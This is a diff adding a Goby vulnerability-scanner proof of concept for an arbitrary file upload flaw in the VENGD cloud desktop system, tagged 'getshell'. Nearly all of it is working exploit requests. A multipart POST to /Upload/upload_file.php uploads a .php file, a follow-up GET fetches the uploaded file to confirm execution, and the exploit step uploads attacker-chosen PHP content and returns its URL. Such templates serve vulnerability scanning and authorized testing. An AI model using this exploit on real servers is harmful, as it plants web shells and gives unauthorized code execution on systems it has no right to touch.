@@ -1,0 +1,161 @@
+{
+      "Name": "VENGD Arbitrary File Upload",
+      "Level": "3",
+      "Tags": [
+            "getshell"
+      ],
+      "GobyQuery": "title=\"和信下一代云桌面VENGD\"",
+      "Description": "和信创天云桌面系统存在任意文件上传",
+      "Product": "VENGD",
+      "Homepage": "https://www.vesystem.com/products/3",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://blog.csdn.net/weixin_44146996/article/details/115611026"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "FileContent",
+                  "Type": "input",
+                  "Value": "&lt;?php phpinfo(); ?&gt;"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/Upload/upload_file.php?l=test",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
+                        },
+                        "data_type": "text",
+                        "data": "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{r1}}}.php\"\nContent-Type: image/avif\n\n<?php\nprint \"{{{str1}}}\";\n?>\n------WebKitFormBoundaryfcKRltGv--",
+                        "set_variable": [
+                              "str1|rand|str|7",
+                              "r1|rand|int|8"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/Upload/test/{{{r1}}}.php",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{str1}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/Upload/upload_file.php?l=test",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
+                        },
+                        "data_type": "text",
+                        "data": "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{r1}}}.php\"\nContent-Type: image/avif\n\n{{{FileContent}}}\n------WebKitFormBoundaryfcKRltGv--",
+                        "set_variable": [
+                              "r1|rand|int|8"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/Upload/test/{{{r1}}}.php",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|define|text|/Upload/test/{{{r1}}}.php"
+                  ]
+            }
+      ],
+      "PostTime": "2021-12-09 13:55:04",
+      "GobyVersion": "1.9.310"
+}
